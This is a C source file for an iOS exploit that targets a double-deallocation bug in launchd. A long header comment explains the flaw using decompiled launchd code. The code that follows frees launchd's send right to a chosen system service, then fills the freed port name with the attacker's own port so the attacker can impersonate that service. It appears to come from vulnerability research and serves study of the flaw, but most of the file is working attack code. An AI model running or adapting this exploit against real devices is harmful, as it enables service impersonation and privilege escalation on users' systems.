/*
 * launchd_portrep_ios
 * Brandon Azad
 *
 *
 * launchd_portrep_ios
 * ================================================================================================
 *
 *  launchd_portrep_ios is an exploit for a port replacement vulnerability in launchd, the initial
 *  userspace process and service management daemon on iOS. By crashing in a particular way, a
 *  process can cause the kernel to send a Mach message to launchd that causes launchd to
 *  over-deallocate a send right to a Mach port in its IPC namespace. This allows an attacker to
 *  impersonate any launchd service it can look up to the rest of the system.
 *
 *  This vulnerability is also present on macOS, but triggering the vulnerability on iOS is more
 *  difficult due to checks in launchd that ensure that the Mach exception message comes from the
 *  kernel.
 *
 *
 * The vulnerability
 * ------------------------------------------------------------------------------------------------
 *
 *  Launchd multiplexes multiple different Mach message handlers over its main port, including a
 *  MIG handler for exception messages. If a process sends a mach_exception_raise or
 *  mach_exception_raise_state_identity message to its own bootstrap port, launchd will receive and
 *  process that message as a host-level exception.
 *
 *  Unfortunately, launchd's handling of these messages is buggy. If the exception type is
 *  EXC_CRASH, then launchd will deallocate the thread and task ports sent in the message and then
 *  return KERN_FAILURE from the service routine, causing the MIG system to deallocate the thread
 *  and task ports again. (The assumption is that if a service routine returns success, then it has
 *  taken ownership of all resources in the Mach message, while if the service routine returns an
 *  error, then it has taken ownership of none of the resources.)
 *
 *  Here is the code from launchd's service routine for mach_exception_raise messages, decompiled
 *  using IDA/Hex-Rays and lightly edited for readability:
 *
 *  	kern_return_t __fastcall
 *  	catch_mach_exception_raise(                             // (a) The service routine is
 *  	        mach_port_t            exception_port,          //     called with values directly
 *  	        mach_port_t            thread,                  //     from the Mach message
 *  	        mach_port_t            task,                    //     sent by the client. The
 *  	        exception_type_t       exception,               //     thread and task ports could
 *  	        mach_exception_data_t  code,                    //     be arbitrary send rights.
 *  	        mach_msg_type_number_t codeCnt)
 *  	{
 *  	    __int64 __stack_guard;                 // ST28_8@1
 *  	    kern_return_t kr;                      // w0@1
 *  	    kern_return_t result;                  // w0@4
 *  	    __int64 codes_left;                    // x25@6
 *  	    mach_exception_data_type_t code_value; // t1@7
 *  	    kern_return_t kr2;                     // w0@8 MAPDST
 *  	    int pid;                               // [xsp+34h] [xbp-44Ch]@1
 *  	    char codes_str[1024];                  // [xsp+38h] [xbp-448h]@7
 *
 *  	    __stack_guard = *__stack_chk_guard_ptr;
 *  	    pid = -1;
 *  	    kr = pid_for_task(task, &pid);
 *  	    if ( kr )
 *  	    {
 *  	        _os_assumes_log(kr);
 *  	        _os_avoid_tail_call();
 *  	    }
 *  	    if ( current_audit_token.val[5] )                   // (b) If the message was sent by
 *  	    {                                                   //     a process with a nonzero PID
 *  	        result = KERN_FAILURE;                          //     (any non-kernel process),
 *  	    }                                                   //     the message is rejected.
 *  	    else
 *  	    {
 *  	        if ( codeCnt )
 *  	        {
 *  	            codes_left = codeCnt;
 *  	            do
 *  	            {
 *  	                code_value = *code;
 *  	                ++code;
 *  	                __snprintf_chk(codes_str, 0x400uLL, 0, 0x400uLL, "0x%llx", code_value);
 *  	                --codes_left;
 *  	            }
 *  	            while ( codes_left );
 *  	        }
 *  	        launchd_log_2(
 *  	            0LL,
 *  	            3LL,
 *  	            "Host-level exception raised: pid = %d, thread = 0x%x, "
 *  	                "exception type = 0x%x, codes = { %s }",
 *  	            pid,
 *  	            thread,
 *  	            exception,
 *  	            codes_str);
 *  	        kr2 = deallocate_port(thread);                  // (c) The "thread" port sent in
 *  	        if ( kr2 )                                      //     the message is deallocated.
 *  	        {
 *  	            _os_assumes_log(kr2);
 *  	            _os_avoid_tail_call();
 *  	        }
 *  	        kr2 = deallocate_port(task);                    // (d) The "task" port sent in the
 *  	        if ( kr2 )                                      //     message is deallocated.
 *  	        {
 *  	            _os_assumes_log(kr2);
 *  	            _os_avoid_tail_call();
 *  	        }
 *  	        if ( exception == EXC_CRASH )                   // (e) If the exception type is
 *  	            result = KERN_FAILURE;                      //     EXC_CRASH, then KERN_FAILURE
 *  	        else                                            //     is returned. MIG will
 *  	            result = 0;                                 //     deallocate the ports again.
 *  	    }
 *  	    *__stack_chk_guard_ptr;
 *  	    return result;
 *  	}
 *
 *  A nearly identical vulnerability is present in the macOS version of launchd, except that in the
 *  iOS version launchd performs an additional check and rejects messages that are not from the
 *  kernel. While this makes the vulnerability harder to trigger, the underlying issue remains. If
 *  a program can cause the kernel to send a mach_exception_raise exception message to launchd with
 *  the thread and task port set to something other than the true thread and task ports for the
 *  crashing thread, the vulnerability could still be exploited do force launchd to deallocate a
 *  send right to a port in its IPC namespace.
 *
 *  As it turns out, there is a Mach trap, task_set_special_port(), that can be used to set a
 *  custom send right to be used in place of the true task port in certain situations. One of these
 *  situations is when the kernel generates an exception message on behalf of a task: instead of
 *  placing the true task send right in the exception message, the kernel will use the send right
 *  supplied by task_set_special_port(). More specifically, if a task calls task_set_special_port()
 *  to set a custom value for its TASK_KERNEL_PORT special port and then the task crashes, the
 *  exception message generated by the kernel will have a send right to the custom port, not the
 *  true task port, in the "task" field. An equivalent API, thread_set_special_port(), can be used
 *  to set a custom port in the "thread" field of the generated exception message.
 *
 *  Because of this behavior, it's actually not difficult at all to make the kernel send a
 *  "malicious" exception message to launchd, bypassing the check in launchd that the exception
 *  message comes from the kernel and triggering the vulnerability.
 *
 *  This bug can be exploited to free launchd's send right to any Mach port to which the attacking
 *  process also has a send right. In particular, if the attacking process can look up a system
 *  service using launchd, then it can free launchd's send right to that service and then
 *  impersonate the service to the rest of the system. After that there are many different routes
 *  to gain system privileges.
 *
 */

#include "launchd_portrep/launchd_portrep.h"

#include "headers/bootstrap.h"
#include "headers/config.h"
#include "launchd_portrep/launchd_portrep_crasher.h"
#include "log/log.h"

#include <assert.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// ---- Replacing a service port in launchd -------------------------------------------------------

// Look up the specified service in launchd, returning the service port.
static mach_port_t
launchd_look_up(const char *service_name) {
	mach_port_t service_port = MACH_PORT_NULL;
	kern_return_t kr = bootstrap_look_up(bootstrap_port, service_name, &service_port);
	if (service_port == MACH_PORT_NULL) {
		ERROR("%s(%s): %u", "bootstrap_look_up", service_name, kr);
	}
	return service_port;
}

// Register a service with launchd.
static bool
launchd_register_service(const char *service_name, mach_port_t port) {
	kern_return_t kr = bootstrap_register(bootstrap_port, service_name, port);
	if (kr != KERN_SUCCESS) {
		ERROR("Could not register %s: %u", service_name, kr);
		return false;
	}
	return true;
}

// Fill the supplied array with newly allocated Mach ports. Each port name denotes a receive right
// and a single send right.
static void
fill_mach_port_array(mach_port_t *ports, size_t count) {
	for (size_t i = 0; i < count; i++) {
		kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE,
				&ports[i]);
		assert(kr == KERN_SUCCESS);
		kr = mach_port_insert_right(mach_task_self(), ports[i], ports[i],
				MACH_MSG_TYPE_MAKE_SEND);
		assert(kr == KERN_SUCCESS);
	}
}

bool
launchd_replace_service_port(const char *service_name,
		mach_port_t *real_service_port, mach_port_t *replacement_service_port) {
	// Using the double-deallocate primitive from launchd_portrep_crasher, we can cause launchd
	// to deallocate its send right to one of the services that it vends (so long as we are
	// allowed to look up that service). Then, by registering a large number of services, we
	// can eventually get that Mach port name to be reused for one of our services. From that
	// point on, when other programs look up the target service in launchd, launchd will send a
	// send right to our fake service rather than the real one.
	const size_t MAX_TRIES_TO_FREE     =  100;
	const size_t MAX_TRIES_TO_REUSE    = 3000;
	const size_t CONSECUTIVE_TRY_LIMIT =  500;
	const size_t PORT_COUNT            = PORT_REUSE_COUNT;
	// Look up the service.
	mach_port_t real_service = launchd_look_up(service_name);
	if (!MACH_PORT_VALID(real_service)) {
		if (real_service == MACH_PORT_DEAD) {
			// The service port has probably already been freed.
			ERROR("launchd returned an invalid service port for %s", service_name);
		}
		return false;
	}
	DEBUG_TRACE(1, "%s: %s = 0x%x", __func__, service_name, real_service);
	// Repeatedly release references on the service until we free launchd's send right.
	// launchd_release_send_right_twice() should also try to bury the freed port partway down
	// launchd's Mach port freelist to make it less likely it will be reused accidentally.
	bool ok = true;
	for (size_t try = 0; ok;) {
		// Release launchd's send right to the service.
		ok = launchd_release_send_right_twice(real_service);
		if (!ok) {
			break;
		}
		// Check whether launchd actually freed the port. If launchd returns a different
		// port for the service, it was freed. Note that usually the lookup will return
		// MACH_PORT_DEAD, but if the port was immediately reused, it's possible it will
		// return another valid port.
		mach_port_t freed_service = launchd_look_up(service_name);
		if (MACH_PORT_VALID(freed_service)) {
			mach_port_deallocate(mach_task_self(), freed_service);
		}
		if (freed_service != real_service) {
			INFO("Freed launchd service port for %s", service_name);
			DEBUG_TRACE(1, "real_service = 0x%x, freed_service = 0x%x",
					real_service, freed_service);
			break;
		}
		// Increase the try count.
		try++;
		if (try >= MAX_TRIES_TO_FREE) {
			// This is where we'll end up when the vulnerability is patched.
			ERROR("Could not free launchd service port for %s", service_name);
			ok = false;
		}
		if (try % CONSECUTIVE_TRY_LIMIT == 0) {
			sleep(2);
		}
	}
	// If we failed to free the port, bail.
	if (!ok) {
		return false;
	}
	// Allocate an array to store our replacement ports. We will register services using these
	// ports until one of them reuses the port name of the freed service port.
	mach_port_t replacement_port = MACH_PORT_NULL;
	mach_port_t *ports = malloc(PORT_COUNT * sizeof(*ports));
	assert(ports != NULL);
	// Try a number of times to replace the freed port. It would be better if we could
	// reliably wrap around the port, but it seems like that's not working for some reason.
	DEBUG_TRACE(1, "%s: Trying to replace the freed port; this could take some time",
			__func__);
	unsigned pid = getpid();
	for (size_t try = 0; ok && replacement_port == MACH_PORT_NULL;) {
		// Allocate a bunch of ports that we will register with launchd.
		fill_mach_port_array(ports, PORT_COUNT);
		// Register a dummy service with launchd for each port. This is an easy way to get
		// a persistent reference to the port in launchd's IPC space.
		for (size_t i = 0; ok && i < PORT_COUNT; i++) {
			char replacer_name[strlen(APP_GROUP) + 72];
			snprintf(replacer_name, sizeof(replacer_name), "%s.replace.%u.%x.%zu.%zu",
					APP_GROUP, pid, real_service, i, try);
			ok = launchd_register_service(replacer_name, ports[i]);
		}
		// Now look up the service again and see if it's one of our ports. Any port that
		// doesn't point to the service gets destroyed, which should unregister the
		// corresponding service we created earlier with launchd.
		mach_port_t new_service = launchd_look_up(service_name);
		for (size_t i = 0; i < PORT_COUNT; i++) {
			if (new_service == ports[i]) {
				assert(replacement_port == MACH_PORT_NULL);
				INFO("Replaced %s with replacer port 0x%x (index %zu) "
						"after %zu %s",
						service_name, ports[i], i, try,
						(try == 1 ? "try" : "tries"));
				replacement_port = ports[i];
			} else {
				mach_port_destroy(mach_task_self(), ports[i]);
			}
		}
#if DEBUG_LEVEL(1)
		// Check if we got back the original service. This happens when launchd owned both
		// the send and receive rights because the service process hasn't actualy started
		// up yet. We can't impersonate the real service until after that service claims
		// the receive right from launchd via bootstrap_check_in(), leaving launchd with
		// only the send right(s).
		if (new_service == real_service) {
			ERROR("%s: Original service restored in launchd!", __func__);
			ok = false;
		}
		// Check if we got something else entirely. This used to happen regularly, but now
		// that we're pushing the freed port down the freelist it's not as common.
		if (new_service != MACH_PORT_DEAD && replacement_port == MACH_PORT_NULL) {
			DEBUG_TRACE(1, "%s: Got something unexpected! 0x%x", __func__,
					new_service);
		}
#endif
		// Deallocate the new service port. If it's the replacement port we already have a
		// ref on it, and if it's something else then we're not going to use it.
		if (MACH_PORT_VALID(new_service)) {
			mach_port_deallocate(mach_task_self(), new_service);
		}
		// Increment our try count if everything before succeeded.
		if (ok) {
			try++;
			if (try >= MAX_TRIES_TO_REUSE) {
				ERROR("Could not replace launchd's service port "
						"for %s after %zu %s", service_name, try,
						(try == 1 ? "try" : "tries"));
				ok = false;
			}
		}
	}
	// Clean up the ports array.
	free(ports);
	// If we failed, bail.
	if (!ok) {
		return false;
	}
	// Set the output ports and return success.
	*real_service_port        = real_service;
	*replacement_service_port = replacement_port;
	return true;
}
